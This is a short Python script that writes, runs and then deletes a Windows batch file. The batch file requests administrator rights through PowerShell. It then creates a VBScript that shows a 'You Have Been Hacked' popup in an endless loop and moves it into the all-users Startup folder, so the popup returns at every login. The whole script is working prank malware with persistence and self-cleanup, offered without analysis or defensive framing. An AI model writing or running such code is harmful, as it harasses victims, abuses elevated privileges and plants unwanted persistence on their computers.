import os
with open("AKAKKAKAKAK.bat", "a", encoding="utf-8") as file:
	lines = []
	lines.append("@echo off\n")
	lines.append("openfiles >nul 2>&1\n")
	lines.append("if %errorlevel% neq 0 (  \n")
	lines.append('    powershell -Command "Start-Process \'%~0\' -Verb runAs"\n')
	lines.append("    exit /b\n")
	lines.append(")\n")
	lines.append('echo Set objShell = CreateObject("WScript.Shell") > troll.vbs\n')
	lines.append("echo Do >> troll.vbs\n")
	lines.append('echo     intButton = objShell.Popup("You Have Been Hacked", 0, "Info", 64) >> troll.vbs\n')
	lines.append("echo Loop While intButton = 1 >> troll.vbs\n")
	lines.append('move "troll.vbs" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"\n')
with open("AKAKKAKAKAK.bat", "w", encoding="utf-8") as file:
	file.writelines(lines)
os.system("AKAKKAKAKAK.bat")
os.system("timeout /t 1 > nul")
os.system("del AKAKKAKAKAK.bat")



